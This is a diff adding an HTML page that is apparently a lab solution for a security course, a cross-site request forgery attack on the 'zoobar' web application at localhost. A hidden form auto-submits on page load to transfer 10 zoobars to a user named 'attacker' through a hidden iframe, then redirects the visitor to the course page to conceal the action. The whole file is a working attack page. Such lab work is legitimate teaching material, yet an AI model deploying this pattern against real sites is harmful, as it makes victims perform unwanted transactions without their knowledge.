@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe style="visibility:hidden" name="iframe">
+</iframe>
+<div style="visibility:hidden" id='idiv'>
+  <form method="post" id="csfr"
+        action="http://localhost:8080/zoobar/index.cgi/transfer"
+  target="iframe" />
+    <input type="hidden" name="zoobars" value="10" />
+    <input type="hidden" name="recipient" value="attacker" />
+    <input  type="submit" />
+</form>
+</div>
+<script type="text/javascript">
+  document.getElementById("csfr").submit();
+  setTimeout(function()
+  {window.location="http://css.csail.mit.edu/6.858/2013/";},1000);
+</script>
+</body>
+</html>
